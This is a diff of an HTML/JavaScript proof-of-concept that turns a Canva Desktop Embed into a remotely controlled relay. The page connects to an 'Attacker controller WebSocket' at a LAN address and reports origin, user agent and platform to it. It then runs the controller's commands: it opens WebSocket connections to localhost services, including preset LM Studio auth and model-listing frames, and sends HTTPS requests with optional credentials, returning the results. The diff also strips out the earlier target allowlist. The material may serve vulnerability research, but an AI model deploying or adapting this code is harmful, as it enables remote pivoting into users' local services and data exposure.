@@ -3,151 +3,600 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Canva Desktop controlled WebSocket relay PoC</title>
+  <title>Canva Desktop network boundary console</title>
   <style>
     :root {
       color-scheme: dark;
-      font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
-      background: #07100d;
-      color: #e8fff5;
+      --bg: #07100d;
+      --surface: #0d1915;
+      --surface-raised: #12231d;
+      --surface-input: #08120f;
+      --line: #29463b;
+      --line-strong: #3e6656;
+      --text: #ecfff7;
+      --muted: #a9c2b8;
+      --faint: #759187;
+      --lime: #adf45d;
+      --cyan: #5ee7d6;
+      --red: #ff8c96;
+      --amber: #ffd27c;
+      --radius: 14px;
+      --mono: "Cascadia Code", "SFMono-Regular", Consolas, monospace;
+      --sans: Aptos, "Segoe UI Variable", "Segoe UI", sans-serif;
     }
 
     * { box-sizing: border-box; }
+    html { background: var(--bg); }
 
     body {
       margin: 0;
       min-height: 100vh;
-      display: grid;
-      place-items: center;
-      padding: 24px;
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--sans);
+      font-size: 14px;
+      line-height: 1.45;
     }
 
-    main {
-      width: min(920px, 100%);
-      border: 1px solid #31564a;
-      border-radius: 14px;
-      background: #0e1c18;
-      padding: 26px;
+    ::selection { background: var(--lime); color: #102008; }
+    :focus-visible { outline: 2px solid var(--cyan); outline-offset: 2px; }
+    ::-webkit-scrollbar { width: 10px; height: 10px; }
+    ::-webkit-scrollbar-track { background: var(--surface-input); }
+    ::-webkit-scrollbar-thumb { background: var(--line-strong); border: 2px solid var(--surface-input); }
+
+    button, input, select, textarea { font: inherit; }
+    button { border: 0; cursor: pointer; }
+    button:disabled { cursor: not-allowed; opacity: .48; }
+
+    .shell { width: min(1500px, 100%); margin: 0 auto; padding: 18px; }
+
+    .topbar {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 24px;
+      padding: 4px 2px 17px;
     }
 
-    h1 { margin: 0 0 12px; font: 700 25px/1.25 system-ui, sans-serif; }
-    p { color: #b9cec6; line-height: 1.5; }
+    .title-wrap { min-width: 0; }
 
-    dl {
-      display: grid;
-      grid-template-columns: max-content 1fr;
-      gap: 7px 14px;
-      margin: 18px 0;
-    }
-
-    dt { color: #84b6a2; }
-    dd { margin: 0; overflow-wrap: anywhere; }
-
-    button {
-      width: 100%;
-      margin: 8px 0 16px;
-      padding: 13px;
-      border: 0;
-      border-radius: 8px;
-      background: #a8f05b;
-      color: #102008;
-      font: 700 16px/1.2 system-ui, sans-serif;
-      cursor: pointer;
-    }
-
-    pre {
-      min-height: 300px;
-      max-height: 52vh;
+    h1 {
       margin: 0;
-      padding: 16px;
-      overflow: auto;
-      overflow-wrap: anywhere;
-      white-space: pre-wrap;
-      border: 1px solid #31564a;
-      border-radius: 8px;
-      background: #050c09;
-      line-height: 1.5;
+      max-width: 860px;
+      font-size: clamp(22px, 3vw, 34px);
+      line-height: 1.08;
+      letter-spacing: -.025em;
+      text-wrap: balance;
     }
 
-    .connected { color: #a8f05b; }
-    .error { color: #ff8f98; }
+    .subtitle { max-width: 74ch; margin: 10px 0 0; color: var(--muted); }
+
+    .summary-status {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: flex-end;
+      gap: 8px;
+    }
+
+    .status-pill {
+      display: inline-flex;
+      align-items: center;
+      min-height: 30px;
+      padding: 5px 10px;
+      border: 1px solid var(--line);
+      border-radius: 999px;
+      background: var(--surface);
+      color: var(--muted);
+      font: 600 12px/1 var(--mono);
+      white-space: nowrap;
+    }
+
+    .status-pill::before {
+      width: 7px;
+      height: 7px;
+      margin-right: 7px;
+      border-radius: 50%;
+      background: var(--faint);
+      content: "";
+    }
+
+    .status-pill[data-state="connected"] { color: var(--lime); border-color: #557d42; }
+    .status-pill[data-state="connected"]::before { background: var(--lime); }
+    .status-pill[data-state="working"] { color: var(--amber); border-color: #806b3b; }
+    .status-pill[data-state="working"]::before { background: var(--amber); }
+    .status-pill[data-state="error"] { color: var(--red); border-color: #7f444a; }
+    .status-pill[data-state="error"]::before { background: var(--red); }
+
+    .notice {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 18px;
+      margin-bottom: 14px;
+      padding: 12px 14px;
+      border: 1px solid #53673a;
+      border-radius: 12px;
+      background: #172019;
+      color: #d8eac6;
+    }
+
+    .notice strong { color: var(--lime); }
+
+    .controller-strip {
+      display: grid;
+      grid-template-columns: minmax(300px, 1.65fr) minmax(180px, .8fr) auto;
+      gap: 12px;
+      align-items: end;
+      padding: 16px;
+      border: 1px solid var(--line);
+      border-radius: var(--radius);
+      background: var(--surface);
+    }
+
+    .field { display: grid; gap: 7px; min-width: 0; }
+
+    label, .label {
+      color: var(--muted);
+      font-size: 12px;
+      font-weight: 650;
+      letter-spacing: .02em;
+    }
+
+    input, select, textarea {
+      width: 100%;
+      border: 1px solid var(--line);
+      border-radius: 9px;
+      background: var(--surface-input);
+      color: var(--text);
+      transition: border-color 140ms ease-out, background-color 140ms ease-out;
+    }
+
+    input, select { min-height: 44px; padding: 8px 10px; }
+    textarea { min-height: 88px; padding: 10px; resize: vertical; }
+    input:hover, select:hover, textarea:hover { border-color: var(--line-strong); }
+    input:focus, select:focus, textarea:focus { border-color: var(--cyan); background: #0a1713; outline: 0; }
+    input::placeholder, textarea::placeholder { color: #668278; }
+
+    .mono { font-family: var(--mono); font-variant-numeric: tabular-nums; }
+    .button-row { display: flex; flex-wrap: wrap; gap: 8px; }
+
+    .btn {
+      min-height: 44px;
+      padding: 9px 14px;
+      border-radius: 9px;
+      background: var(--lime);
+      color: #122008;
+      font-weight: 750;
+      transition: transform 140ms ease-out, background-color 140ms ease-out;
+    }
+
+    .btn:hover:not(:disabled) { background: #c3ff7d; transform: translateY(-1px); }
+    .btn:active:not(:disabled) { transform: translateY(0); }
+
+    .btn.secondary {
+      border: 1px solid var(--line-strong);
+      background: var(--surface-raised);
+      color: var(--text);
+    }
+
+    .btn.secondary:hover:not(:disabled) { background: #193029; }
+
+    .workspace {
+      display: grid;
+      grid-template-columns: minmax(0, 1fr) minmax(0, 1fr);
+      gap: 14px;
+      margin-top: 14px;
+    }
+
+    .workbench {
+      min-width: 0;
+      overflow: hidden;
+      border: 1px solid var(--line);
+      border-radius: var(--radius);
+      background: var(--surface);
+    }
+
+    .workbench-head {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      padding: 16px 17px;
+      border-bottom: 1px solid var(--line);
+    }
+
+    .workbench-head h2 { margin: 0; font-size: 17px; line-height: 1.2; letter-spacing: -.01em; }
+    .protocol { color: var(--cyan); font: 700 11px/1 var(--mono); }
+    .workbench-body { display: grid; gap: 14px; padding: 16px; }
+
+    .field-grid {
+      display: grid;
+      grid-template-columns: minmax(0, 1fr) minmax(120px, .36fr);
+      gap: 10px;
+    }
+
+    .field-grid.three { grid-template-columns: .34fr 1fr .44fr; }
+
+    .quick-actions {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 7px;
+      padding-top: 2px;
+    }
+
+    .quick-actions .label { margin-right: 3px; }
+
+    .mini-btn {
+      min-height: 44px;
+      padding: 6px 9px;
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      background: var(--surface-raised);
+      color: var(--muted);
+      font: 650 12px/1 var(--sans);
+    }
+
+    .mini-btn:hover { border-color: var(--cyan); color: var(--text); }
+
+    .field-hint {
+      margin: 0;
+      color: var(--faint);
+      font-size: 11px;
+      line-height: 1.4;
+    }
+
+    .channel-list {
+      min-height: 49px;
+      padding: 10px;
+      border: 1px solid var(--line);
+      border-radius: 9px;
+      background: var(--surface-input);
+      color: var(--muted);
+      font-family: var(--mono);
+      font-size: 12px;
+    }
+
+    .channel-row {
+      display: grid;
+      grid-template-columns: minmax(80px, .25fr) minmax(0, 1fr) auto;
+      gap: 10px;
+      align-items: center;
+    }
+
+    .channel-row + .channel-row { margin-top: 7px; }
+    .channel-url { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .state-open { color: var(--lime); }
+    .state-wait { color: var(--amber); }
+    .state-closed { color: var(--red); }
+
+    .output {
+      min-height: 145px;
+      max-height: 300px;
+      margin: 0;
+      padding: 12px;
+      overflow: auto;
+      border: 1px solid var(--line);
+      border-radius: 9px;
+      background: #050c09;
+      color: #dff7ed;
+      font: 12px/1.55 var(--mono);
+      white-space: pre-wrap;
+      overflow-wrap: anywhere;
+      tab-size: 2;
+    }
+
+    .http-options { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 9px; }
+
+    .activity {
+      margin-top: 14px;
+      overflow: hidden;
+      border: 1px solid var(--line);
+      border-radius: var(--radius);
+      background: #050c09;
+    }
+
+    .activity-head {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      padding: 12px 15px;
+      border-bottom: 1px solid var(--line);
+    }
+
+    .activity-head h2 { margin: 0; font-size: 14px; }
+
+    .activity-log {
+      height: 260px;
+      overflow: auto;
+      padding: 10px 14px 15px;
+      font: 12px/1.55 var(--mono);
+    }
+
+    .log-line {
+      display: grid;
+      grid-template-columns: 94px 82px minmax(0, 1fr);
+      gap: 10px;
+      padding: 4px 0;
+      border-bottom: 1px solid rgba(41, 70, 59, .35);
+    }
+
+    .log-time { color: var(--faint); }
+    .log-scope { color: var(--cyan); }
+    .log-message { color: var(--muted); overflow-wrap: anywhere; }
+    .log-line.error .log-message { color: var(--red); }
+    .log-line.success .log-message { color: var(--lime); }
+    .log-empty { color: var(--faint); padding: 9px 0; }
+
+    .footnote { margin: 12px 2px 0; color: var(--faint); font-size: 12px; }
+
+    @media (max-width: 980px) {
+      .topbar { display: grid; }
+      .summary-status { justify-content: flex-start; }
+      .controller-strip { grid-template-columns: 1fr 1fr; }
+      .controller-strip .button-row { grid-column: 1 / -1; }
+      .workspace { grid-template-columns: 1fr; }
+    }
+
+    @media (max-width: 620px) {
+      .shell { padding: 12px; }
+      .notice { display: block; }
+      .controller-strip, .field-grid, .field-grid.three, .http-options { grid-template-columns: 1fr; }
+      .controller-strip .button-row { grid-column: auto; }
+      .log-line { grid-template-columns: 76px 66px minmax(0, 1fr); gap: 7px; }
+      .activity-log { height: 220px; padding-inline: 10px; }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after { scroll-behavior: auto !important; transition: none !important; }
+    }
   </style>
 </head>
 <body>
-  <main>
-    <h1>Controlled WebSocket relay</h1>
-    <p>
-      Owned-lab demonstration. The remote operator can select one of the fixed
-      WebSocket targets below, send application-protocol frames, and receive
-      the target's replies through the controller channel. The target list and
-      traffic limits are PoC-side safeguards, not Canva restrictions.
+  <main class="shell">
+    <header class="topbar">
+      <div class="title-wrap">
+        <h1>Canva Desktop network boundary console</h1>
+        <p class="subtitle">
+          Interactive owned-lab PoC for operator-controlled WebSocket traffic and HTTPS requests
+          from a foreign Embed. Results remain visible here and can also be relayed to the controller.
+        </p>
+      </div>
+      <div class="summary-status" aria-label="Runtime status">
+        <span class="status-pill" id="controller-status" data-state="idle" role="status" aria-live="polite" aria-atomic="true">controller idle</span>
+        <span class="status-pill" id="ws-status" data-state="idle" role="status" aria-live="polite" aria-atomic="true">no WS target</span>
+        <span class="status-pill" id="http-status" data-state="idle" role="status" aria-live="polite" aria-atomic="true">HTTPS idle</span>
+      </div>
+    </header>
+
+    <div class="notice" role="note">
+      <span><strong>Authorized testing only.</strong> Enter only endpoints owned or explicitly approved by the tester.</span>
+      <span class="mono">origin=<span id="page-origin"></span></span>
+    </div>
+
+    <section class="controller-strip" aria-labelledby="controller-heading">
+      <div class="field">
+        <label for="controller-url" id="controller-heading">Attacker controller WebSocket</label>
+        <input class="mono" id="controller-url" type="url" spellcheck="false" value="ws://192.168.1.21:8766/control">
+      </div>
+      <div class="field">
+        <label for="controller-token">Throwaway pairing token</label>
+        <input class="mono" id="controller-token" type="password" spellcheck="false"
+          aria-describedby="controller-token-note" value="f014-owned-lab-2026">
+        <p class="field-hint" id="controller-token-note">Lab pairing only—not strong authentication. Query-string tokens may remain in browser history.</p>
+      </div>
+      <div class="button-row">
+        <button class="btn" id="controller-connect" type="button">Connect</button>
+        <button class="btn secondary" id="controller-disconnect" type="button">Disconnect</button>
+      </div>
+    </section>
+
+    <div class="workspace">
+      <section class="workbench" aria-labelledby="ws-heading">
+        <header class="workbench-head">
+          <h2 id="ws-heading">WebSocket relay</h2>
+          <span class="protocol">WS / WSS</span>
+        </header>
+        <div class="workbench-body">
+          <div class="field-grid">
+            <div class="field">
+              <label for="ws-url">Target endpoint</label>
+              <input class="mono" id="ws-url" type="url" spellcheck="false" value="ws://127.0.0.1:1234/system">
+            </div>
+            <div class="field">
+              <label for="ws-channel">Channel</label>
+              <input class="mono" id="ws-channel" type="text" maxlength="48" value="lmsystem">
+            </div>
+          </div>
+
+          <div class="field">
+            <label for="ws-protocols">Subprotocols <span class="mono">(comma separated, optional)</span></label>
+            <input class="mono" id="ws-protocols" type="text" spellcheck="false" placeholder="graphql-ws, custom-v1">
+          </div>
+
+          <div class="button-row">
+            <button class="btn" id="ws-open" type="button">Open target</button>
+            <button class="btn secondary" id="ws-close" type="button">Close channel</button>
+          </div>
+
+          <div class="channel-list" id="channel-list"><span class="log-empty">No target sockets are open.</span></div>
+
+          <div class="field">
+            <label for="ws-payload">Application-protocol frame</label>
+            <textarea class="mono" id="ws-payload" spellcheck="false">{"authVersion":1,"clientIdentifier":"owned-impact-poc","clientPasskey":"owned-impact-poc"}</textarea>
+          </div>
+
+          <div class="button-row">
+            <button class="btn" id="ws-send-text" type="button">Send text frame</button>
+            <button class="btn secondary" id="ws-send-base64" type="button">Send base64 frame</button>
+          </div>
+
+          <div class="quick-actions" aria-label="LM Studio test messages">
+            <span class="label">LM Studio:</span>
+            <button class="mini-btn" id="lm-auth" type="button">Auth frame</button>
+            <button class="mini-btn" id="lm-version" type="button">Read version</button>
+            <button class="mini-btn" id="lm-models" type="button">List models</button>
+          </div>
+
+          <pre class="output" id="ws-output">Target replies will appear here.</pre>
+        </div>
+      </section>
+
+      <section class="workbench" aria-labelledby="http-heading">
+        <header class="workbench-head">
+          <h2 id="http-heading">HTTPS request builder</h2>
+          <span class="protocol">FETCH / TLS</span>
+        </header>
+        <div class="workbench-body">
+          <div class="field-grid three">
+            <div class="field">
+              <label for="http-method">Method</label>
+              <select class="mono" id="http-method">
+                <option>GET</option><option>POST</option><option>PUT</option><option>PATCH</option>
+                <option>DELETE</option><option>HEAD</option><option>OPTIONS</option>
+              </select>
+            </div>
+            <div class="field">
+              <label for="http-url">Target endpoint</label>
+              <input class="mono" id="http-url" type="url" spellcheck="false" value="https://127.0.0.1:8443/">
+            </div>
+            <div class="field">
+              <label for="http-timeout">Timeout ms</label>
+              <input class="mono" id="http-timeout" type="number" min="500" max="30000" step="500" value="10000">
+            </div>
+          </div>
+
+          <div class="http-options">
+            <div class="field"><label for="http-mode">Mode</label><select class="mono" id="http-mode"><option value="cors">cors</option><option value="no-cors">no-cors</option></select></div>
+            <div class="field"><label for="http-credentials">Credentials</label><select class="mono" id="http-credentials"><option value="omit">omit</option><option value="include">include</option><option value="same-origin">same-origin</option></select></div>
+            <div class="field"><label for="http-redirect">Redirect</label><select class="mono" id="http-redirect"><option value="follow">follow</option><option value="manual">manual</option><option value="error">error</option></select></div>
+            <div class="field"><label for="http-cache">Cache</label><select class="mono" id="http-cache"><option value="no-store">no-store</option><option value="default">default</option><option value="reload">reload</option></select></div>
+          </div>
+
+          <div class="field">
+            <label for="http-headers">Headers as JSON</label>
+            <textarea class="mono" id="http-headers" spellcheck="false">{}</textarea>
+          </div>
+
+          <div class="field">
+            <label for="http-body">Request body</label>
+            <textarea class="mono" id="http-body" spellcheck="false" placeholder="Empty for GET/HEAD"></textarea>
+          </div>
+
+          <div class="button-row">
+            <button class="btn" id="http-send" type="button">Send HTTPS request</button>
+            <button class="btn secondary" id="http-cancel" type="button">Cancel request</button>
+          </div>
+
+          <pre class="output" id="http-output">Response status, headers, digest and bounded body will appear here.</pre>
+        </div>
+      </section>
+    </div>
+
+    <section class="activity" aria-labelledby="activity-heading">
+      <header class="activity-head">
+        <h2 id="activity-heading">Evidence log</h2>
+        <button class="mini-btn" id="clear-log" type="button">Clear visible log</button>
+      </header>
+      <div class="activity-log" id="activity-log">
+        <div class="log-empty">Waiting for controller or manual test activity.</div>
+      </div>
+    </section>
+
+    <p class="footnote">
+      The PoC does not bypass TLS validation, CORS, target authentication, WebSocket Origin checks,
+      or browser-forbidden request headers. An opaque response proves dispatch only, not response disclosure.
     </p>
-    <dl>
-      <dt>Page origin</dt><dd id="origin"></dd>
-      <dt>Controller</dt><dd id="controller"></dd>
-      <dt>Allowed targets</dt><dd id="targets"></dd>
-      <dt>Status</dt><dd id="status">initializing</dd>
-    </dl>
-    <button id="reconnect" type="button">Reconnect controller</button>
-    <pre id="log" aria-live="polite"></pre>
   </main>
 
   <script>
     (() => {
       "use strict";
 
-      // Add only tester-owned destinations needed for the current lab run.
-      // This allowlist is deliberately imposed by the PoC. Canva does not
-      // provide or enforce an equivalent destination restriction.
-      const ALLOWED_TARGETS = new Set([
-        "ws://127.0.0.1:8765/owned-ws",
-        "ws://127.0.0.1:1234/llm",
-        "ws://127.0.0.1:1234/system"
-      ]);
+      const MAX_TARGET_SOCKETS = 8;
+      const MAX_TEXT_FRAME_BYTES = 256 * 1024;
+      const MAX_BINARY_FRAME_BYTES = 512 * 1024;
+      const MAX_HTTP_RESPONSE_BYTES = 1024 * 1024;
+      const MAX_LOG_LINES = 300;
+      const DEFAULT_CONTROLLER = "ws://192.168.1.21:8766/control";
+      const DEFAULT_TOKEN = "f014-owned-lab-2026";
+      const CHANNEL_PATTERN = /^[a-zA-Z0-9_.-]{1,48}$/;
+      const HTTP_METHODS = new Set(["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"]);
 
-      const MAX_TARGET_SOCKETS = 4;
-      const MAX_TEXT_FRAME_BYTES = 64 * 1024;
-      const MAX_BINARY_FRAME_BYTES = 256 * 1024;
-      const DEFAULT_CONTROLLER = "ws://ATTACKER_LAN_IP:8766/control";
-      const params = new URLSearchParams(location.search);
-      const controllerUrl = params.get("controller") || DEFAULT_CONTROLLER;
-      const controllerToken = params.get("token") || "CHANGE_ME";
+      const nodes = {
+        pageOrigin: document.querySelector("#page-origin"),
+        controllerStatus: document.querySelector("#controller-status"),
+        wsStatus: document.querySelector("#ws-status"),
+        httpStatus: document.querySelector("#http-status"),
+        controllerUrl: document.querySelector("#controller-url"),
+        controllerToken: document.querySelector("#controller-token"),
+        controllerConnect: document.querySelector("#controller-connect"),
+        controllerDisconnect: document.querySelector("#controller-disconnect"),
+        wsUrl: document.querySelector("#ws-url"),
+        wsChannel: document.querySelector("#ws-channel"),
+        wsProtocols: document.querySelector("#ws-protocols"),
+        wsPayload: document.querySelector("#ws-payload"),
+        wsOpen: document.querySelector("#ws-open"),
+        wsClose: document.querySelector("#ws-close"),
+        wsSendText: document.querySelector("#ws-send-text"),
+        wsSendBase64: document.querySelector("#ws-send-base64"),
+        wsOutput: document.querySelector("#ws-output"),
+        channelList: document.querySelector("#channel-list"),
+        lmAuth: document.querySelector("#lm-auth"),
+        lmVersion: document.querySelector("#lm-version"),
+        lmModels: document.querySelector("#lm-models"),
+        httpMethod: document.querySelector("#http-method"),
+        httpUrl: document.querySelector("#http-url"),
+        httpTimeout: document.querySelector("#http-timeout"),
+        httpMode: document.querySelector("#http-mode"),
+        httpCredentials: document.querySelector("#http-credentials"),
+        httpRedirect: document.querySelector("#http-redirect"),
+        httpCache: document.querySelector("#http-cache"),
+        httpHeaders: document.querySelector("#http-headers"),
+        httpBody: document.querySelector("#http-body"),
+        httpSend: document.querySelector("#http-send"),
+        httpCancel: document.querySelector("#http-cancel"),
+        httpOutput: document.querySelector("#http-output"),
+        activityLog: document.querySelector("#activity-log"),
+        clearLog: document.querySelector("#clear-log")
+      };
 
-      const logNode = document.querySelector("#log");
-      const statusNode = document.querySelector("#status");
-      const reconnectButton = document.querySelector("#reconnect");
       const targetSockets = new Map();
+      const logEntries = [];
       let controller = null;
-      let sequence = 0;
+      let controllerSequence = 0;
+      let httpAbortController = null;
+      let lmCallId = 0;
 
-      document.querySelector("#origin").textContent = location.origin;
-      document.querySelector("#controller").textContent = controllerUrl;
-      document.querySelector("#targets").textContent = [...ALLOWED_TARGETS].join(", ");
+      const params = new URLSearchParams(location.search);
+      nodes.controllerUrl.value = params.get("controller") || DEFAULT_CONTROLLER;
+      nodes.controllerToken.value = params.get("token") || DEFAULT_TOKEN;
+      nodes.pageOrigin.textContent = location.origin;
 
-      function now() {
-        return new Date().toISOString();
+      function now() { return new Date().toISOString(); }
+
+      function setPill(node, text, state = "idle") {
+        node.textContent = text;
+        node.dataset.state = state;
       }
 
-      function log(message, isError = false) {
-        const line = `[${now()}] ${message}`;
-        logNode.textContent += `${line}\n`;
-        logNode.scrollTop = logNode.scrollHeight;
-        if (isError) statusNode.className = "error";
-      }
+      function updateControls() {
+        const controllerActive = controller && controller.readyState < WebSocket.CLOSING;
+        nodes.controllerConnect.disabled = Boolean(controllerActive);
+        nodes.controllerDisconnect.disabled = !controllerActive;
 
-      function setStatus(value, className = "") {
-        statusNode.textContent = value;
-        statusNode.className = className;
-      }
+        const selectedChannel = nodes.wsChannel.value.trim();
+        const selectedSocket = targetSockets.get(selectedChannel);
+        const selectedOpen = selectedSocket && selectedSocket.readyState === WebSocket.OPEN;
+        nodes.wsOpen.disabled = !CHANNEL_PATTERN.test(selectedChannel) || Boolean(selectedSocket);
+        nodes.wsClose.disabled = !selectedSocket;
+        nodes.wsSendText.disabled = !selectedOpen;
+        nodes.wsSendBase64.disabled = !selectedOpen;
 
-      function sendController(message) {
-        if (!controller || controller.readyState !== WebSocket.OPEN) return false;
-        controller.send(JSON.stringify({
-          sequence: ++sequence,
-          time: now(),
-          ...message
-        }));
-        return true;
+        const httpBusy = Boolean(httpAbortController);
+        nodes.httpSend.disabled = httpBusy;
+        nodes.httpCancel.disabled = !httpBusy;
       }
 
       function serializeError(error) {
@@ -155,6 +604,194 @@
           name: error && error.name ? String(error.name) : "Error",
           message: error && error.message ? String(error.message) : String(error)
         };
+      }
+
+      function formatJson(value) { return JSON.stringify(value, null, 2); }
+
+      function log(scope, message, level = "info") {
+        logEntries.push({ time: now(), scope, message: String(message), level });
+        if (logEntries.length > MAX_LOG_LINES) logEntries.splice(0, logEntries.length - MAX_LOG_LINES);
+        renderLog();
+      }
+
+      function renderLog() {
+        nodes.activityLog.replaceChildren();
+        if (!logEntries.length) {
+          const empty = document.createElement("div");
+          empty.className = "log-empty";
+          empty.textContent = "Waiting for controller or manual test activity.";
+          nodes.activityLog.append(empty);
+          return;
+        }
+        const fragment = document.createDocumentFragment();
+        for (const entry of logEntries) {
+          const row = document.createElement("div");
+          row.className = `log-line ${entry.level}`;
+          const time = document.createElement("span");
+          time.className = "log-time";
+          time.textContent = entry.time.slice(11, 23);
+          const scope = document.createElement("span");
+          scope.className = "log-scope";
+          scope.textContent = entry.scope;
+          const message = document.createElement("span");
+          message.className = "log-message";
+          message.textContent = entry.message;
+          row.append(time, scope, message);
+          fragment.append(row);
+        }
+        nodes.activityLog.append(fragment);
+        nodes.activityLog.scrollTop = nodes.activityLog.scrollHeight;
+      }
+
+      function sendController(message) {
+        if (!controller || controller.readyState !== WebSocket.OPEN) return false;
+        controller.send(JSON.stringify({ sequence: ++controllerSequence, time: now(), ...message }));
+        return true;
+      }
+
+      function redactUrl(value) {
+        try {
+          const url = new URL(value);
+          for (const key of ["token", "key", "secret", "password", "auth"]) {
+            if (url.searchParams.has(key)) url.searchParams.set(key, "[redacted]");
+          }
+          return url.href;
+        } catch { return String(value); }
+      }
+
+      function connectController() {
+        const url = nodes.controllerUrl.value.trim();
+        const token = nodes.controllerToken.value;
+        let parsed;
+        try {
+          parsed = new URL(url);
+          if (parsed.protocol !== "ws:" && parsed.protocol !== "wss:") throw new Error("controller must use ws:// or wss://");
+        } catch (error) {
+          setPill(nodes.controllerStatus, "invalid controller", "error");
+          log("CONTROL", error.message, "error");
+          updateControls();
+          return;
+        }
+
+        disconnectController("reconnect requested");
+        setPill(nodes.controllerStatus, "controller connecting", "working");
+        log("CONTROL", `CONNECTING ${redactUrl(url)}`);
+
+        let socket;
+        try {
+          socket = new WebSocket(parsed.href);
+          controller = socket;
+          updateControls();
+        }
+        catch (error) {
+          setPill(nodes.controllerStatus, "controller failed", "error");
+          log("CONTROL", `${error.name}: ${error.message}`, "error");
+          updateControls();
+          return;
+        }
+
+        socket.addEventListener("open", () => {
+          if (controller !== socket) return;
+          setPill(nodes.controllerStatus, "controller connected", "connected");
+          log("CONTROL", "OPEN; sending agent metadata", "success");
+          updateControls();
+          sendController({
+            type: "agent.hello", token, origin: location.origin,
+            userAgent: navigator.userAgent, platform: navigator.platform
+          });
+        });
+
+        socket.addEventListener("message", event => {
+          if (controller !== socket) return;
+          try {
+            if (typeof event.data !== "string") throw new Error("controller commands must be text JSON");
+            const command = JSON.parse(event.data);
+            if (!command || command.type !== "command") throw new Error("expected command object");
+            log("CONTROL", `command ${command.commandId || "missing"}: ${command.action}`);
+            void executeCommand(command, "controller").catch(() => {});
+          } catch (error) {
+            log("CONTROL", `invalid message: ${error.message}`, "error");
+            sendController({ type: "protocol.error", error: serializeError(error) });
+          }
+        });
+
+        socket.addEventListener("error", () => {
+          if (controller !== socket) return;
+          setPill(nodes.controllerStatus, "controller error", "error");
+          log("CONTROL", "WEBSOCKET_ERROR", "error");
+          updateControls();
+        });
+
+        socket.addEventListener("close", event => {
+          if (controller !== socket) return;
+          controller = null;
+          setPill(nodes.controllerStatus, `controller closed ${event.code}`, "error");
+          log("CONTROL", `CLOSED code=${event.code} reason=${event.reason || "none"}`);
+          updateControls();
+        });
+      }
+
+      function disconnectController(reason = "operator disconnect") {
+        const socket = controller;
+        controller = null;
+        if (socket && socket.readyState < WebSocket.CLOSING) socket.close(1000, String(reason).slice(0, 120));
+        setPill(nodes.controllerStatus, "controller idle", "idle");
+        updateControls();
+      }
+
+      function validateChannel(value) {
+        const channel = String(value || "").trim();
+        if (!CHANNEL_PATTERN.test(channel)) throw new Error("channel must match [a-zA-Z0-9_.-]{1,48}");
+        return channel;
+      }
+
+      function validateWebSocketUrl(value) {
+        const url = new URL(String(value || "").trim());
+        if (url.protocol !== "ws:" && url.protocol !== "wss:") throw new Error("target must use ws:// or wss://");
+        return url.href;
+      }
+
+      function renderChannels() {
+        nodes.channelList.replaceChildren();
+        if (!targetSockets.size) {
+          const empty = document.createElement("span");
+          empty.className = "log-empty";
+          empty.textContent = "No target sockets are open.";
+          nodes.channelList.append(empty);
+          setPill(nodes.wsStatus, "no WS target", "idle");
+          updateControls();
+          return;
+        }
+
+        const fragment = document.createDocumentFragment();
+        let openCount = 0;
+        for (const [channel, socket] of targetSockets) {
+          const row = document.createElement("div");
+          row.className = "channel-row";
+          const channelNode = document.createElement("span");
+          channelNode.textContent = channel;
+          const urlNode = document.createElement("span");
+          urlNode.className = "channel-url";
+          urlNode.title = socket.url;
+          urlNode.textContent = socket.url;
+          const stateNode = document.createElement("span");
+          if (socket.readyState === WebSocket.OPEN) {
+            openCount += 1;
+            stateNode.className = "state-open";
+            stateNode.textContent = "OPEN";
+          } else if (socket.readyState < WebSocket.OPEN) {
+            stateNode.className = "state-wait";
+            stateNode.textContent = "CONNECTING";
+          } else {
+            stateNode.className = "state-closed";
+            stateNode.textContent = "CLOSING";
+          }
+          row.append(channelNode, urlNode, stateNode);
+          fragment.append(row);
+        }
+        nodes.channelList.append(fragment);
+        setPill(nodes.wsStatus, openCount ? `${openCount} WS open` : `${targetSockets.size} WS connecting`, openCount ? "connected" : "working");
+        updateControls();
       }
 
       function bytesToBase64(bytes) {
@@ -166,173 +803,256 @@
         return btoa(binary);
       }
 
+      function base64ToBytes(encoded) {
+        const binary = atob(String(encoded));
+        if (binary.length > MAX_BINARY_FRAME_BYTES) throw new Error(`binary frame exceeds ${MAX_BINARY_FRAME_BYTES} bytes`);
+        return Uint8Array.from(binary, character => character.charCodeAt(0));
+      }
+
       function closeTarget(channel, code = 1000, reason = "operator close") {
-        const socket = targetSockets.get(channel);
+        const normalized = validateChannel(channel);
+        const socket = targetSockets.get(normalized);
         if (!socket) return false;
-        targetSockets.delete(channel);
-        if (socket.readyState < WebSocket.CLOSING) {
-          socket.close(code, String(reason).slice(0, 120));
-        }
+        targetSockets.delete(normalized);
+        if (socket.readyState < WebSocket.CLOSING) socket.close(code, String(reason).slice(0, 120));
+        renderChannels();
+        log("WS", `close requested for ${normalized}`);
         return true;
       }
 
       function closeAllTargets(reason) {
-        for (const channel of [...targetSockets.keys()]) {
-          closeTarget(channel, 1000, reason);
-        }
+        for (const channel of [...targetSockets.keys()]) closeTarget(channel, 1000, reason);
       }
 
       function openTarget(command) {
-        const channel = String(command.channel || "").trim();
-        const url = String(command.url || "").trim();
-        if (!/^[a-zA-Z0-9_.-]{1,48}$/.test(channel)) {
-          throw new Error("channel must match [a-zA-Z0-9_.-]{1,48}");
-        }
-        if (!ALLOWED_TARGETS.has(url)) {
-          throw new Error(`target is not in the PoC allowlist: ${url}`);
-        }
-        if (targetSockets.has(channel)) {
-          throw new Error(`channel already exists: ${channel}`);
-        }
-        if (targetSockets.size >= MAX_TARGET_SOCKETS) {
-          throw new Error("target socket limit reached");
-        }
+        const channel = validateChannel(command.channel);
+        const url = validateWebSocketUrl(command.url);
+        if (targetSockets.has(channel)) throw new Error(`channel already exists: ${channel}`);
+        if (targetSockets.size >= MAX_TARGET_SOCKETS) throw new Error("target socket limit reached");
 
